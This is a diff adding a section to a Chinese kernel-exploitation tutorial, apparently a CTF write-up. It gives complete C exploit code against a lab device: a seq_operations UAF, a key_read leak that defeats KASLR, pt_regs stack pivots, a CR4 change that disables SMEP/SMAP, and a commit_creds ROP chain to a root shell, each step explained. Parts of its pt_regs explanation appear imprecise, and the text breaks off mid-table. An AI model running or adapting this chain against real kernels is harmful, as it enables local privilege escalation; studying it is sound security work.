@@ -1687,8 +1687,743 @@ flowchart TD
               height: auto;">
 </div>
 
+## 7. 进阶分析：seq_operations结构利用
+
+exploit核心代码如下：
+
+```c
+#define SPRAY_COUNT 128
+#define SEQ_OPERATIONS_SIZE 0x20
+
+#define PROC_SINGLE_SHOW 0xffffffff812c6670
+#define PREPARE_KERNEL_CRED 0xffffffff81099460
+#define COMMIT_CREDS 0xffffffff81098f30
+#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81e00ed0
+#define ADD_RSP_0X168_POP_RBP_RET 0xffffffff8117bf8d
+#define POP_RDI_RET 0xffffffff810bb338
+#define MOV_CR4_RDI_RET 0xffffffff81037e22
+#define MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET 0xffffffff81ce41bb
+#define POP_RSP_RET 0xffffffff8111b07f
+
+size_t pop_rsp_ret;
+size_t pop_rdi_ret;
+size_t mov_cr4_rdi_ret;
+
+static int dev_fd;
+static int seq_fd[SPRAY_COUNT];
+static int victim_seq_fd;
+static int victim_key_id;
+static size_t rop_chain[0x100];
+size_t rop_chain_addr = (size_t)&rop_chain;
+
+struct chunk_info {
+  size_t idx;
+  size_t size;
+  void *buf;
+};
+
+/* Allocate kernel object */
+static void alloc_chunk(size_t idx, size_t size, void *buf) {
+  struct chunk_info chunk = {
+      .idx = idx,
+      .size = size,
+      .buf = buf,
+  };
+  ioctl(dev_fd, 0xdeadbeef, &chunk);
+}
+
+/* Free kernel object */
+static void free_chunk(size_t idx) {
+  struct chunk_info chunk = {
+      .idx = idx,
+  };
+  ioctl(dev_fd, 0xc0decafe, &chunk);
+}
+
+int main(void) {
+  size_t *payload;
+  char desc[0x100] = {0};
+  int found = 0;
+
+  memset(desc, 'A', 0x100);
+  desc[0x100 - 1] = '\0';
+
+  /* ========== STAGE 1: ENVIRONMENT SETUP ========== */
+  log.info("Stage 1: Environment Setup");
+  bind_core(0);
+  save_status();
+  log.debug("Core bound, registers saved");
+
+  payload = (size_t *)malloc(sizeof(size_t) * 0x4000);
+  if (!payload) {
+    log.error("Failed to allocate R/W buffer");
+    exit(EXIT_FAILURE);
+  }
+  log.debug("R/W buffer allocated at: 0x%lx", (size_t)payload);
+
+  /* ========== STAGE 2: DEVICE INITIALIZATION ========== */
+  log.info("Stage 2: Device Initialization");
+  dev_fd = open("/dev/rwctf", O_RDONLY);
+  if (dev_fd < 0) {
+    log.error("Cannot open vulnerable device");
+    exit(EXIT_FAILURE);
+  }
+  log.success("Device opened, fd: %d", dev_fd);
+
+  /* ========== STAGE 3: SLAB PREPARATION ========== */
+  log.info("Stage 3: Slab Preparation");
+  for (int i = 0; i < SPRAY_COUNT; i++) {
+    seq_fd[i] = open("/proc/self/stat", O_RDONLY);
+    if (seq_fd[i] < 0) {
+      log.error("Failed to spray seq_operations");
+      exit(EXIT_FAILURE);
+    }
+  }
+  log.debug("Sprayed %d seq_operations objects", SPRAY_COUNT);
+
+  /* ========== STAGE 4: UAF CREATION ========== */
+  log.info("Stage 4: UAF Creation");
+  alloc_chunk(0, SEQ_OPERATIONS_SIZE, payload);
+  alloc_chunk(1, SEQ_OPERATIONS_SIZE, payload);
+  free_chunk(1);
+  free_chunk(0);
+  log.debug("Double-free condition created");
+
+  /* ========== STAGE 5: KEY STRUCTURE OVERLAP ========== */
+  log.info("Stage 5: Key Structure Overlap");
+  victim_key_id = key_alloc(desc, payload, SEQ_OPERATIONS_SIZE - 0x18);
+  if (victim_key_id < 0) {
+    log.error("Failed to allocate key for heap feng shui");
+    exit(EXIT_FAILURE);
+  }
+  log.debug("Key allocated, id: %d", victim_key_id);
+
+  free_chunk(1);
+  log.debug("Dangling pointer created");
+
+  /* ========== STAGE 6: VICTIM SEQ_OPERATIONS CONTROL ========== */
+  log.info("Stage 6: Victim seq_operations Control");
+  victim_seq_fd = open("/proc/self/stat", O_RDONLY);
+  if (victim_seq_fd < 0) {
+    log.error("Failed to open victim seq_file");
+    exit(EXIT_FAILURE);
+  }
+  log.debug("Victim seq_operations controlled");
+
+  /* ========== STAGE 7: MEMORY LEAK PRIMITIVE ========== */
+  log.info("Stage 7: Memory Leak Primitive");
+  free_chunk(1);
+  payload[0] = 0;
+  payload[1] = 0;
+  payload[2] = 0x2000;
+  alloc_chunk(1, 0x20, payload);
+  log.debug("Read primitive prepared");
+
+  /* ========== STAGE 8: KERNEL BASE LEAK ========== */
+  log.info("Stage 8: Kernel Base Leak");
+  long ret = key_read(victim_key_id, payload, 0xffff);
+  if (ret < 0) {
+    log.error("Key read failed");
+    exit(EXIT_FAILURE);
+  }
+  log.debug("Read %ld bytes via corrupted key", ret);
+
+  for (int i = 0; i < 0x2000 / 8; i++) {
+    if (payload[i] > kernel_base &&
+        ((payload[i] & 0xfff) == (PROC_SINGLE_SHOW & 0xfff))) {
+      log.success("Leak proc_single_show: 0x%lx", payload[i]);
+      kernel_offset = payload[i] - PROC_SINGLE_SHOW;
+      kernel_base += kernel_offset;
+      found = 1;
+      break;
+    }
+  }
+
+  if (!found) {
+    log.error("Failed to leak kernel pointer");
+    exit(EXIT_FAILURE);
+  }
+  log.success("Kernel base: 0x%lx", kernel_base);
+  log.success("Kernel offset: 0x%lx", kernel_offset);
+
+  /* ========== STAGE 9: ROP CHAIN PREPARATION ========== */
+  log.info("Stage 9: ROP Chain Preparation");
+  free_chunk(1);
+  payload[0] = kernel_offset + ADD_RSP_0X168_POP_RBP_RET;
+  payload[1] = 0;
+  payload[2] = 0;
+  alloc_chunk(1, 0x20, payload);
+  log.debug("Stack pivot gadget placed at seq_operations->start");
+
+  int i = 0;
+  rop_chain[i++] = kernel_offset + POP_RDI_RET;
+  rop_chain[i++] = 0;
+  rop_chain[i++] = kernel_offset + PREPARE_KERNEL_CRED;
+  rop_chain[i++] = kernel_offset + MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET;
+  rop_chain[i++] = kernel_offset + COMMIT_CREDS;
+  rop_chain[i++] =
+      kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x3d;
+  rop_chain[i++] = *(size_t *)"BinRacer";
+  rop_chain[i++] = *(size_t *)"BinRacer";
+  rop_chain[i++] = (size_t)get_root_shell;
+  rop_chain[i++] = user_cs;
+  rop_chain[i++] = user_rflags;
+  rop_chain[i++] = user_sp + 8;
+  rop_chain[i++] = user_ss;
+  log.debug("ROP chain with %d entries prepared", i);
+
+  /* ========== STAGE 10: EXPLOIT TRIGGER ========== */
+  log.info("Stage 10: Exploit Trigger");
+  pop_rsp_ret = kernel_offset + POP_RSP_RET;
+  pop_rdi_ret = kernel_offset + POP_RDI_RET;
+  mov_cr4_rdi_ret = kernel_offset + MOV_CR4_RDI_RET;
+
+  log.info("Triggering syscall to execute ROP chain");
+  __asm__("mov r15,   0xbeefdead;"
+          "mov r14,   pop_rdi_ret;"
+          "mov r13,   0x6f0;"
+          "mov r12,   mov_cr4_rdi_ret;"
+          "mov rbp,   pop_rsp_ret;"
+          "mov rbx,   rop_chain_addr;"
+          "mov r11,   0x66666666;"
+          "mov r10,   0x77777777;"
+          "mov r9,    0x88888888;"
+          "mov r8,    0x99999999;"
+          "xor rax,   rax;"
+          "mov rcx,   0xaaaaaaaa;"
+          "mov rdx,   8;"
+          "mov rsi,   rsp;"
+          "mov rdi,   victim_seq_fd;"
+          "syscall");
+  return 0;
+}
+```
+
+本章节将深入分析一种基于`seq_operations`内核结构的进阶操作方法。与之前探讨管道和tty子系统的方法相比，该方法针对序列文件（sequential file）子系统，通过类似的内存操作原理实现信息获取与执行流引导。`seq_operations`结构是Linux内核中用于实现`/proc`文件系统序列操作的核心数据结构，其大小为0x20字节，位于`kmalloc-32`缓存中，这为内存状态分析提供了新的应用场景。
+
+整个分析过程将分为环境准备、UAF条件构造、信息获取、ROP链构造、双重栈迁移等多个阶段，每个阶段都将详细解析其操作逻辑和技术要点。通过这种方法，可以深入理解内核内存管理和子系统交互机制，为系统安全研究提供参考。
+
+### 7-1. 核心数据结构与环境初始化
+
+**seq_operations结构**是Linux内核中序列文件操作的核心数据结构，用于管理`/proc`文件系统中序列文件的读取操作。其大小为0x20字节，位于`kmalloc-32`缓存中。该结构包含四个关键函数指针：`start`、`next`、`stop`、`show`，这为控制流引导提供了可能。
+
+**内核配置环境**：测试内核应用了特定补丁，注释了`cr_pinning`的启用，允许修改CR4寄存器：
+
+```diff
+--- a/arch/x86/kernel/cpu/common.c
++++ b/arch/x86/kernel/cpu/common.c
+@@ -503,7 +503,7 @@ void cr4_init(void)
+ static void __init setup_cr_pinning(void)
+ {
+     cr4_pinned_bits = this_cpu_read(cpu_tlbstate.cr4) & cr4_pinned_mask;
+-    static_key_enable(&cr_pinning.key);
++    // static_key_enable(&cr_pinning.key);
+}
+```
+
+此补丁禁用了CR4寄存器的pin功能，允许修改CR4寄存器中的SMEP（Supervisor Mode Execution Protection）和SMAP（Supervisor Mode Access Prevention）位。在高版本内核中，这是必要的，因为CR4的pin功能会阻止修改这些保护位。
+
+**环境准备**：此阶段目标是初始化环境并进行堆喷射，填充`kmalloc-32`缓存，为后续UAF条件创造基础。操作流程如下图所示：
+
+```mermaid
+flowchart TD
+    A[开始: 环境准备] --> B[步骤1: 环境绑定与状态保存]
+    B --> C["bind_core(0) 绑定CPU核心"]
+    C --> D["save_status() 保存寄存器状态"]
+    D --> E[步骤2: 资源分配]
+    E --> F["分配payload缓冲区 (0x4000字节)"]
+    F --> G[步骤3: 设备初始化]
+    G --> H["open('/dev/rwctf', O_RDONLY)"]
+    H --> I[步骤4: 堆喷射填充缓存]
+    I --> J["循环128次: open('/proc/self/stat', O_RDONLY)"]
+    J --> K[内核空间: 分配seq_operations结构]
+    K --> L["kzalloc(sizeof(struct seq_operations), GFP_KERNEL)"]
+    L --> M[环境准备完成]
+
+    style C fill:#e1f5fe
+    style D fill:#e1f5fe
+    style F fill:#e1f5fe
+    style H fill:#e1f5fe
+    style J fill:#e1f5fe
+    style L fill:#c8e6c9
+    style M fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+```
+
+**详细操作解析**：
+
+1. **环境绑定**：通过`bind_core(0)`将进程绑定到特定CPU核心，减少多核环境下的竞争条件，提高堆布局的确定性。
+
+2. **状态保存**：调用`save_status()`保存用户态寄存器状态（CS、RFLAGS、RSP、SS等），为后续从内核态返回用户态的安全切换做准备。
+
+3. **资源分配**：分配大小为0x4000字节的缓冲区`payload`，用于存储key_alloc的载荷数据和key_read读取的内核数据。缓冲区大小选择考虑了需要容纳完整的key_alloc的载荷数据和key_read从内核读取的数据。
+
+4. **设备初始化**：打开目标设备文件`/dev/rwctf`，获取设备文件描述符`dev_fd`。这是与内核模块交互的基础。
+
+5. **堆喷射填充缓存**：通过循环128次调用`open("/proc/self/stat", O_RDONLY)`，触发内核分配`seq_operations`结构。选择128次是基于`kmalloc-32`缓存的特点，确保有效填充空闲链表。每次`open`操作都会在内核中分配一个`seq_operations`结构，填充`kmalloc-32`缓存。
+
+**seq_operations分配内核路径**：
+
+```
+用户空间调用 open("/proc/self/stat")
+  ↓
+__x64_sys_open (系统调用入口)
+  ↓
+do_sys_open (系统调用处理)
+  ↓
+do_filp_open (文件打开核心逻辑)
+  ↓
+seq_open (序列文件打开)
+  ↓
+__seq_open_private (分配私有数据)
+  ↓
+kzalloc(sizeof(struct seq_operations), GFP_KERNEL) (分配seq_operations结构)
+```
+
+### 7-2. UAF条件构造与密钥重叠
+
+获得初始环境后，此阶段目标是通过模块操作构造UAF条件，并利用密钥子系统创建内存重叠。操作流程如下图所示：
+
+```mermaid
+flowchart TD
+    A[UAF条件构造] --> B[步骤1: 创建UAF对象]
+    B --> C["alloc_chunk(0, 0x20, payload)"]
+    C --> D["alloc_chunk(1, 0x20, payload)"]
+    D --> E["free_chunk(1) 释放对象1"]
+    E --> F["free_chunk(0) 释放对象0"]
+    F --> G[步骤2: 分配密钥创建重叠]
+    G --> H["victim_key_id = key_alloc(desc, payload, 0x8)"]
+    H --> I[内核空间: 分配user_key_payload]
+    I --> J["kvmalloc(plen, GFP_KERNEL)"]
+    J --> K[步骤3: 释放创建悬垂指针]
+    K --> L["free_chunk(1) 释放密钥"]
+    L --> M[UAF条件构造完成]
+
+    style C fill:#e1f5fe
+    style D fill:#e1f5fe
+    style E fill:#fff3e0
+    style F fill:#fff3e0
+    style H fill:#e1f5fe
+    style J fill:#c8e6c9
+    style L fill:#fff3e0
+    style M fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+```
+
+**详细操作解析**：
+
+1. **创建UAF对象**：通过`alloc_chunk`分配两个0x20字节对象，然后依次释放，在`kmalloc-32`缓存中制造悬垂指针。此操作与之前的方法类似，但目标缓存更小（kmalloc-32），需要更精确的内存控制。
+
+2. **分配密钥创建重叠**：通过`key_alloc`分配一个密钥，负载大小为0x8字节（0x20 - 0x18）。这会在`kmalloc-32`缓存中分配一个`user_key_payload`结构，有高概率占据步骤1释放的某个空闲槽，创建内存重叠。
+
+3. **释放创建悬垂指针**：调用`free_chunk(1)`释放密钥，但密钥子系统仍持有指向已释放内存的引用。这构造了典型的"一处内存，两种状态"冲突，为后续信息获取创造条件。
+
+**内存状态变化**：
+
+- 初始状态：`kmalloc-32`缓存被大量`seq_operations`对象填充
+- 步骤1后：两个0x20字节对象被释放，进入空闲链表
+- 步骤2后：`user_key_payload`结构占据其中一个空闲槽
+- 步骤3后：该内存被释放，但密钥子系统仍持有引用
+
+### 7-3. 受害者控制与信息获取
+
+完成UAF条件构造后，此阶段目标是控制受害者`seq_operations`结构并获取内核基址。操作流程如下图所示：
+
+```mermaid
+flowchart TD
+    A[受害者控制与信息获取] --> B[步骤1: 控制受害者seq_operations]
+    B --> C["victim_seq_fd = open('/proc/self/stat', O_RDONLY)"]
+    C --> D[内核空间: 分配受害者结构]
+    D --> E["kzalloc(sizeof(struct seq_operations), GFP_KERNEL)"]
+    E --> F[步骤2: 准备读原语]
+    F --> G["free_chunk(1) 释放内存"]
+    G --> H["设置payload[2] = 0x2000"]
+    H --> I["alloc_chunk(1, 0x20, payload)"]
+    I --> J[步骤3: 内核基址获取]
+    J --> K["key_read(victim_key_id, payload, 0xffff)"]
+    K --> L[内核空间: copy_to_user 拷贝数据]
+    L --> M[搜索泄露指针]
+    M --> N["遍历payload匹配PROC_SINGLE_SHOW"]
+    N --> O["计算kernel_offset = 获取地址 - PROC_SINGLE_SHOW"]
+    O --> P[内核基址获取完成]
+
+    style C fill:#f3e5f5
+    style D fill:#d4edda
+    style E fill:#c8e6c9
+    style G fill:#fff3e0
+    style I fill:#e1f5fe
+    style K fill:#d4edda
+    style L fill:#d1ecf1
+    style O fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+    style P fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+```
+
+**详细操作解析**：
+
+1. **控制受害者seq_operations**：通过`open("/proc/self/stat", O_RDONLY)`打开一个序列文件，触发内核分配`seq_operations`结构。由于前序布局，该结构有高概率从预设的内存区域分配，使得可以通过密钥子系统间接控制该结构。
+
+2. **准备读原语**：
+    - 调用`free_chunk(1)`释放当前内存
+    - 设置`payload[2] = 0x2000`，为后续越界读取做准备
+    - 调用`alloc_chunk(1, 0x20, payload)`重新分配内存并写入数据
+    - 这会将某个`user_key_payload`的`datalen`字段修改为0x2000，创建越界读取原语
+
+3. **内核基址获取**：
+    - 通过`key_read(victim_key_id, payload, 0xffff)`读取密钥数据
+    - 在内核中，这会触发`copy_to_user`操作，将内核数据拷贝到用户空间
+    - 在读取的数据中搜索匹配`PROC_SINGLE_SHOW`特征的指针
+    - 计算`kernel_offset = 获取地址 - PROC_SINGLE_SHOW`，得到内核偏移
+    - 更新`kernel_base`变量，完全绕过KASLR保护
+
+**信息获取原理**：
+
+- 由于`user_key_payload`的`datalen`字段被修改为0x2000，`key_read`会读取远超实际大小的数据
+- 在读取的数据中包含相邻内核对象的指针，如`seq_operations`结构中的函数指针
+- 通过匹配已知函数指针的低12位（页对齐），可以可靠识别目标函数
+- 计算与静态地址的偏移，得到内核基址
+
+### 7-4. ROP链构造与第一次栈迁移准备
+
+获得内核基址后，此阶段目标是构造ROP链并准备第一次栈迁移。这是实现控制流引导的关键步骤，为后续利用`pt_regs`结构布局创造条件。操作流程如下图所示：
+
+```mermaid
+flowchart TD
+    A[ROP链构造与第一次栈迁移准备] --> B[步骤1: 准备第一次栈迁移gadget]
+    B --> C["free_chunk(1) 释放内存"]
+    C --> D["payload[0] = kernel_offset + ADD_RSP_0X168_POP_RBP_RET"]
+    D --> E["alloc_chunk(1, 0x20, payload)"]
+    E --> F[步骤2: 构造ROP链]
+    F --> G["设置ROP链数组rop_chain[0x100]"]
+    G --> H["布置权限变更指令序列"]
+    H --> I["POP_RDI_RET → prepare_kernel_cred(0)"]
+    I --> J["MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET"]
+    J --> K["COMMIT_CREDS"]
+    K --> L["SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE"]
+    L --> M[步骤3: 准备pt_regs布局所需gadget]
+    M --> N["设置pop_rsp_ret, pop_rdi_ret, mov_cr4_rdi_ret"]
+    N --> O[第一次栈迁移准备完成]
+
+    style C fill:#fff3e0
+    style D fill:#e1f5fe
+    style E fill:#e1f5fe
+    style G fill:#fff3e0
+    style I fill:#d4edda
+    style J fill:#d1ecf1
+    style K fill:#d4edda
+    style L fill:#d1ecf1
+    style N fill:#fff3e0
+    style O fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+```
+
+**详细操作解析**：
+
+1. **准备第一次栈迁移gadget**：
+    - 调用`free_chunk(1)`释放当前内存
+    - 设置`payload[0] = kernel_offset + ADD_RSP_0X168_POP_RBP_RET`
+    - 调用`alloc_chunk(1, 0x20, payload)`重新分配内存并写入数据
+    - 这使得`seq_operations->start`指针指向栈迁移gadget，为第一次栈迁移创造条件
+
+2. **构造ROP链**：
+    - 在`rop_chain`数组中按顺序布置ROP指令地址
+    - 权限变更序列：`POP_RDI_RET` → `prepare_kernel_cred(0)` → `MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET` → `COMMIT_CREDS`
+    - 返回用户态序列：`SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE` + 偏移
+    - 用户态返回信息：CS、RFLAGS、RSP、SS寄存器值
+    - 目标函数地址：`get_root_shell`函数地址
+
+3. **准备pt_regs布局所需gadget**：
+    - 计算关键gadget地址：`pop_rsp_ret`、`pop_rdi_ret`、`mov_cr4_rdi_ret`
+    - 这些地址将在后续`pt_regs`布局中使用，用于第二次栈迁移和CR4修改
+    - 这些gadget的地址计算基于之前获得的内核基址，确保指向正确的内核代码位置
+
+**第一次栈迁移的作用**：
+
+- `ADD_RSP_0X168_POP_RBP_RET` gadget将栈指针增加0x168字节
+- 这个偏移经过精心计算，使栈指针迁移到内核栈上的`pt_regs`结构之后
+- 迁移后的位置为后续利用`pt_regs`中保存的寄存器值创造了条件
+- 这是实现双重栈迁移的第一步，为完整的控制流引导奠定基础
+
+**ROP链布局详解**：
+
+```
+rop_chain[0]:  POP_RDI_RET (设置RDI为0)
+rop_chain[1]:  0 (prepare_kernel_cred参数)
+rop_chain[2]:  PREPARE_KERNEL_CRED (调用prepare_kernel_cred(0))
+rop_chain[3]:  MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET (传递返回值)
+rop_chain[4]:  COMMIT_CREDS (调用commit_creds)
+rop_chain[5]:  SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x3d (返回用户态)
+rop_chain[6-7]: 占位数据
+rop_chain[8]:  get_root_shell函数地址
+rop_chain[9-12]: 用户态寄存器状态 (CS, RFLAGS, RSP, SS)
+```
+
+### 7-5. pt_regs布局与第二次栈迁移
+
+完成ROP链构造和第一次栈迁移准备后，此阶段核心是利用`pt_regs`结构布局和第二次栈迁移技术，通过精心设置的寄存器状态引导控制流。`pt_regs`是内核在系统调用入口保存用户态寄存器状态的数据结构，其布局提供了在返回路径中控制执行流的机制。操作流程如下图所示：
+
+```mermaid
+flowchart TD
+    A[pt_regs利用与第二次栈迁移] --> B[步骤1: 精心设置寄存器状态]
+    B --> C["设置R15=0xbeefdead (标识)"]
+    C --> D["设置R14=pop_rdi_ret gadget地址"]
+    D --> E["设置R13=0x6f0 (目标CR4值)"]
+    E --> F["设置R12=mov_cr4_rdi_ret gadget地址"]
+    F --> G["设置RBP=pop_rsp_ret gadget地址"]
+    G --> H["设置RBX=rop_chain_addr (ROP链地址)"]
+    H --> I["设置R11-R8为特定值"]
+    I --> J[步骤2: 设置系统调用参数]
+    J --> K["设置RAX=0 (read系统调用号)"]
+    K --> L["设置RCX=0xaaaaaaaa"]
+    L --> M["设置RDX=8"]
+    M --> N["设置RSI=RSP"]
+    N --> O["设置RDI=victim_seq_fd"]
+    O --> P[步骤3: 执行系统调用]
+    P --> Q["syscall 触发read系统调用"]
+    Q --> R[内核空间: 保存寄存器到pt_regs结构]
+    R --> S["执行seq_read → seq_operations->start()"]
+    S --> T["第一次栈迁移: ADD_RSP_0X168_POP_RBP_RET"]
+    T --> U["栈指针调整到pt_regs之后"]
+    U --> V[从pt_regs恢复寄存器]
+    V --> W["利用恢复的寄存器执行操作"]
+    W --> X["修改CR4: 通过R12/R13关闭SMEP/SMAP"]
+    X --> Y["第二次栈迁移: 通过RBP/RBX迁移到ROP链"]
+    Y --> Z[执行ROP链提权]
+    Z --> AA[返回用户态执行get_root_shell]
+
+    style B fill:#fff3e0
+    style J fill:#fff3e0
+    style P fill:#e1f5fe
+    style Q fill:#f3e5f5
+    style R fill:#d4edda
+    style S fill:#c8e6c9
+    style T fill:#fce4ec
+    style U fill:#e1f5fe
+    style V fill:#d4edda
+    style X fill:#fff3e0
+    style Y fill:#e1f5fe
+    style Z fill:#d1ecf1
+    style AA fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+```
+
+**pt_regs结构详解**：
+
+`pt_regs`结构是内核在系统调用入口保存用户态寄存器状态的数据结构。在x86_64架构中，其典型布局如下（从高地址到低地址）：
+
+```c
+struct pt_regs {
+    unsigned long r15;
+    unsigned long r14;
+    unsigned long r13;
+    unsigned long r12;
+    unsigned long rbp;
+    unsigned long rbx;
+    unsigned long r11;
+    unsigned long r10;
+    unsigned long r9;
+    unsigned long r8;
+    unsigned long rax;
+    unsigned long rcx;
+    unsigned long rdx;
+    unsigned long rsi;
+    unsigned long rdi;
+    unsigned long orig_rax;
+    unsigned long rip;
+    unsigned long cs;
+    unsigned long eflags;
+    unsigned long rsp;
+    unsigned long ss;
+    /* 以下省略其他字段 */
+};
+```
+
+**详细操作解析**：
+
+1. **精心设置寄存器状态**：
+    - **R15**: 设置为0xbeefdead，作为标识符
+    - **R14**: 设置为`pop_rdi_ret` gadget地址，用于后续设置RDI寄存器
+    - **R13**: 设置为0x6f0，这是目标CR4寄存器值，用于关闭SMEP/SMAP保护
+    - **R12**: 设置为`mov_cr4_rdi_ret` gadget地址，用于修改CR4寄存器
+    - **RBP**: 设置为`pop_rsp_ret` gadget地址，用于第二次栈迁移
+    - **RBX**: 设置为`rop_chain_addr`，ROP链起始地址
+    - 其他寄存器（R11-R8）设置为特定值，确保控制流按预期转移
+
+2. **设置系统调用参数**：
+    - 设置`RAX=0`，对应`read`系统调用号
+    - 设置`RCX=0xaaaaaaaa`，特定值
+    - 设置`RDX=8`，读取长度
+    - 设置`RSI=RSP`，缓冲区地址
+    - 设置`RDI=victim_seq_fd`，目标文件描述符
+
+3. **执行系统调用**：
+    - 执行`syscall`指令触发`read`系统调用
+    - 内核进入`__x64_sys_read`，将用户态寄存器保存到内核栈的`pt_regs`结构中
+    - 内核处理`read`系统调用，对序列文件调用`seq_read`函数
+    - `seq_read`调用`seq_operations->start()`函数，其指针已被修改为栈迁移gadget
+
+4. **第一次栈迁移**：
+    - 执行栈迁移gadget `ADD_RSP_0X168_POP_RBP_RET`
+    - 这个gadget将栈指针增加0x168字节
+    - 经过精心计算，这个偏移使RSP指向`pt_regs`结构之后的位置
+    - 执行`POP_RBP`，从栈上弹出值到RBP（此时栈上是什么值不确定，但不影响后续）
+
+5. **从pt_regs恢复寄存器**：
+    - 在系统调用返回路径上，内核会从`pt_regs`结构恢复寄存器状态
+    - 由于第一次栈迁移，控制流没有走正常的返回路径，但寄存器恢复机制仍然有效
+    - 关键寄存器R12、R13、R14、RBP、RBX被恢复为此前预设的值
+
+6. **修改CR4关闭保护**：
+    - 控制流转移到`mov_cr4_rdi_ret` gadget（通过R12设置）
+    - 这个gadget执行`mov cr4, rdi; ret`，将R13的值（0x6f0）写入CR4寄存器
+    - CR4值0x6f0清除SMEP（第20位）和SMAP（第21位），允许内核执行用户空间代码
+    - 内核补丁禁用cr_pinning是修改CR4的前提条件
+
+7. **第二次栈迁移**：
+    - 控制流转移到`pop_rsp_ret` gadget（通过RBP设置）
+    - 这个gadget执行`pop rsp; ret`，从栈上弹出值到RSP
+    - 由于栈指针位置，弹出的值是RBX寄存器指向的地址（`rop_chain_addr`）
+    - 栈指针迁移到ROP链起始位置
+
+8. **执行ROP链提权**：
+    - 控制流进入ROP链，执行`pop_rdi_ret` gadget（通过R14设置）
+    - 设置RDI为0，调用`prepare_kernel_cred(0)`获取root凭证
+    - 调用`commit_creds`应用凭证
+    - 执行`SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE`返回用户态
+    - 传递用户态寄存器状态，确保安全切换
+
+9. **执行用户空间函数**：
+    - 返回用户态后，执行`get_root_shell()`函数
+    - 这个函数弹出一个具有root权限的shell
+    - 完成整个操作流程
+
+**寄存器设置与pt_regs对应关系**：
+
+| 寄存器 | 设置值          | 在pt_regs中的偏移 | 用途               |
+| ------ | --------------- | ----------------- | ------------------ |
+| R15    | 0xbeefdead      | +0x00             | 标识符，验证布局   |
+| R14    | pop_rdi_ret     | +0x08             | 设置RDI的gadget    |
+| R13    | 0x6f0           | +0x10             | CR4目标值          |
+| R12    | mov_cr4_rdi_ret | +0x18             | 修改CR4的gadget    |
+| RBP    | pop_rsp_ret     | +0x20             | 第二次栈迁移gadget |
+| RBX    | rop_chain_addr  | +0x28             | ROP链地址          |
+| R11    | 0x66666666      | +0x30             | 控制流条件         |
+| R10    | 0x77777777      | +0x38             | 控制流条件         |
+| R9     | 0x88888888      | +0x40             | 控制流条件         |
+| R8     | 0x99999999      | +0x48             | 控制流条件         |
+| RAX    | 0               | +0x50             | 系统调用号         |
+| RCX    | 0xaaaaaaaa      | +0x58             | 控制流条件         |
+| RDX    | 8               | +0x60             | 读取长度           |
+| RSI    | RSP             | +0x68             | 缓冲区地址         |
+| RDI    | victim_seq_fd   | +0x70             | 文件描述符         |
+
+**双重栈迁移机制**：
+
+1. **第一次迁移**：通过`ADD_RSP_0X168_POP_RBP_RET`将栈指针调整0x168字节，使RSP指向`pt_regs`结构之后。0x168这个值经过精心计算，确保迁移后的栈位置能够正确访问恢复的寄存器。
+
+2. **第二次迁移**：通过`pop_rsp_ret` gadget从栈上弹出`rop_chain_addr`到RSP，将栈迁移到用户空间控制的ROP链。这个迁移利用了从`pt_regs`恢复的寄存器值。
+
+**系统调用触发路径**：
+
+```
+用户空间执行 syscall
+  ↓
+__x64_sys_read (系统调用入口)
+  ↓
+保存寄存器到pt_regs结构
+  ↓
+vfs_read (虚拟文件系统读取)
+  ↓
+seq_read (序列文件读取)
+  ↓
+seq_operations->start() (调用被修改的start指针)
+  ↓
+ADD_RSP_0X168_POP_RBP_RET (第一次栈迁移)
+  ↓
+从pt_regs恢复寄存器
+  ↓
+mov_cr4_rdi_ret (修改CR4关闭保护)
+  ↓
+pop_rsp_ret (第二次栈迁移到ROP链)
+  ↓
+pop_rdi_ret → prepare_kernel_cred(0) (ROP链提权)
+  ↓
+commit_creds (应用凭证)
+  ↓
+SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE (返回用户态)
+  ↓
+get_root_shell() (执行用户空间函数)
+```
+
+**CR4修改的重要性**：
+
+- CR4寄存器控制多种CPU特性，包括SMEP和SMAP保护
+- SMEP防止内核执行用户空间代码
+- SMAP防止内核访问用户空间数据
+- 值0x6f0会清除SMEP（第20位）和SMAP（第21位），允许内核执行用户空间ROP链
+- 内核补丁禁用cr_pinning是修改CR4的前提条件
+
+### 7-6. 技术要点与对比分析
+
+与管道和tty操作方法相比，seq_operations方法体现了以下技术特点：
+
+1. **pt_regs结构利用**：通过精心设置寄存器值，利用系统调用保存寄存器到pt_regs的机制，在返回路径中恢复预设值，实现控制流引导。这是与其他方法显著不同的地方。
+
+2. **双重栈迁移**：采用两次栈迁移技术，第一次迁移到pt_regs区域，第二次迁移到用户空间ROP链。这种双重迁移提供了更高的灵活性和可靠性。
+
+3. **更小的缓存大小**：`seq_operations`大小为0x20字节，位于`kmalloc-32`缓存，而`tty_struct`为0x2b8字节（kmalloc-1024），`pipe_inode_info`为0xa8字节（kmalloc-192）。这展示了技术在不同大小对象上的广泛适用性。
+
+4. **直接系统调用触发**：通过内联汇编直接调用系统调用，提供更精细的寄存器控制，不同于通过标准库函数触发的方式。
+
+5. **CR4修改集成**：将CR4修改直接集成到寄存器设置中，利用pt_regs恢复机制自动执行，无需在ROP链中显式包含。
+
+**与pipe/tty方法的全面对比**：
+
+| 对比维度        | seq_operations方法               | pipe方法                    | tty方法                |
+| --------------- | -------------------------------- | --------------------------- | ---------------------- |
+| **目标结构**    | seq_operations (0x20字节)        | pipe_inode_info (0xa8字节)  | tty_struct (0x2b8字节) |
+| **缓存类型**    | kmalloc-32                       | kmalloc-192                 | kmalloc-1024           |
+| **栈迁移机制**  | 双重迁移: pt_regs + ROP链        | 直接栈翻转                  | 函数调用跳转           |
